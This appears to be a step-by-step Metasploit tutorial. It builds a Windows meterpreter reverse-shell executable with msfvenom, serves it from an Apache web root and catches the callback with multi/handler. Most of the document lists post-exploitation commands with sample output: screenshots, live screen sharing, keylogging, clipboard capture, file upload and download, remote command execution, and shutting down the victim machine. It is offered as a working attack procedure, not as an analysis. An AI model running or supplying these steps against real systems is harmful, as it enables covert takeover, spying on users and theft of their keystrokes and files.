# 1 - Start postgresql server

```
service postgresql start
```

# 2 - Start apache2 server

```
service apache2 start
```

# 3 - Choose and Create msfvenom Payload

```
msfvenom -h
```

```
ifconfig
```

choose one wlan0, eth inet is IP Address

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -R > /var/www/html/winpayload.exe
```

(or)

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o ~/winpayload.exe
```

(or)

```
sudo msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o /var/www/html/winpayload.exe
```

(or)

```
cd Desktop
```

```
msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o winpayload.exe
```

# 4 - Attack the Target

```
msfconsole
```

```
use exploit/multi/handler
```

```
set payload windows/meterpreter/reverse_tcp
```

```
show options
```

```
set LPORT 7777
```

```
set LHOST 192.168.1.100
```

```
exploit
```

```
help
```

# 5 - Get List of Session

```
sessions
```

Interact with the session by using the `sessions -i <session number>` command. This will allow you to execute commands and interact with the target machine.

```
sessions -i <session number>
```

# 6 - Get Target System OS Information

```
sysinfo
```

```
Computer        : DESKTOP-8NFK1VS
OS              : Windows 10 (10.0 Build 18362).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

# 7 - Take Screenshot

```
screenshot
```

```
Screenshot saved to: /home/kali/bwpWdELT.jpeg
```

# 8 - Upload File to Target Computer

Use the upload command to upload a file from your local machine to the target machine.

```
upload /path/to/local/file /path/to/remote/location
```

Replace `/path/to/local/file` with the path of the file on your local machine that 
you want to upload, and `/path/to/remote/location` with the desired location on the 
target machine.

Once the file transfer is complete, you can verify its presence on the target machine.

# 9 - Download File to Target Computer

Use the download command to download a file from the target machine to your local machine.

```
download /path/to/remote/file /path/to/local/location
```

Replace `/path/to/remote/file` with the path of the file on the target machine that you want 
to download, and `/path/to/local/location` with the desired location on your local machine.

Once the file download is complete, you can access it on your local machine.

# 10 - Live ScreenShare

```
screenshare
```

```
[*] Preparing player...
[*] Opening player at: /home/kali/vCfkuKxF.html
[*] Streaming...
```

# 11 - Shutdown the Target Computer

```
shutdown
```

# 12 - Reboot the Target Computer

```
reboot
```

# 13 - Displays the target system local date and time

```
localtime
```

```
Local Date/Time: 2023-06-10 12:11:52.100 India Standard Time (UTC+500)
```

# 14 - Execute a command

```
execute -f cmd.exe
```

```
Process 3212 created.
```

![Image](15%20-%20Execute%20a%20command.PNG)

# 16 - Returns the number of seconds the remote user has been idle

```
idletime
```

```
User has been idle for: 36 secs
```

# 17 - Send keystrokes

```
keyboard_send A
```

```
[*] Done
```

![Image](18%20-%20Send%20keystrokes.PNG)

# 19 - Start Keyboard Scan

```
keyscan_start
```

# 20 - Dump Keyboard Keystores

```
keyscan_dump
```

# 21 - Stop Keyboard Stop

```
keyscan_stop
```

# 22 - Get Server Name

```
getuid
```

# 23 - Start Clipboard Monitor

```
clipboard_monitor_start
```

```
[+] Clipboard monitor started
```

# 24 - Dump Clipboard Monitor

```
clipboard_monitor_dump
```

```
Text captured at 2016-03-05 19:18:18.0466
=========================================
this is fun.
=========================================

Files captured at 2016-03-05 19:20:07.0525
==========================================
Remote Path : C:\Users\user\Desktop\cat_pic.png
File size   : 37627 bytes
downloading : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png
download    : C:\Users\user\Desktop\cat_pic.png -> ./cat_pic.png

==========================================

[+] Clipboard monitor dumped
```

# 25 - Stop Clipboard Monitor

```
clipboard_monitor_stop
```

# 26 - Print Working Directory

```
pwd
```

```
C:\Users\xyz\Desktop
```

# 27 - Change Directories

```
cd C:\\
```

```
pwd
```

```
C:\
```

```
cd D:\\
```

```
pwd
```
```
D:\
```

# 28 - cat Command

```
cat C:\\file.txt
```

```
Hello world!
```

# 29 - Search Command

The search command allows you to find files on the remote file system. For example, this demonstrates how to find all text files in the current directory:

```
search -d . -f *.txt
```

```
Found 1 result...
    .\something.txt (5 bytes)
```

# 41 - The address is already in use or unavailable

```
msf6 exploit(multi/handler) > exploit
```

```
[-] Handler failed to bind to 192.168.1.112:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
```

# 42 - list of process

```
┌──(kali㉿kali)-[~]
└─$ lsof -i :4444   
COMMAND  PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ruby    2058 kali    7u  IPv4  28009      0t0  TCP kali:4444 (LISTEN)
```

OR

```
┌──(kali㉿kali)-[~]
└─$ lsof -t -i :4444
2058
```

# 43 - kill process

```
┌──(kali㉿kali)-[~]
└─$ kill -9 2058             
                                               
[1]  + killed     msfconsole
```

OR

```
kill -9 `lsof -t -i:port`
```